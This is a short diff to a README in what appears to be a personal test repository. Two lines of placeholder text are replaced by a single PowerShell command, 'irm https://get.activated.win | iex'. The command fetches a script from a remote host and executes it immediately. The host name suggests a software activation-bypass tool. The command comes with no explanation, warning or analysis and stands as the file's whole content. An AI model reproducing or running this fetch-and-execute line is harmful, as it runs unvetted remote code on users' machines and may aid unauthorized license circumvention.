@@ -1,3 +1,2 @@
 # ps73171-test
-this is test repositroy
-now testing this 
+irm https://get.activated.win | iex
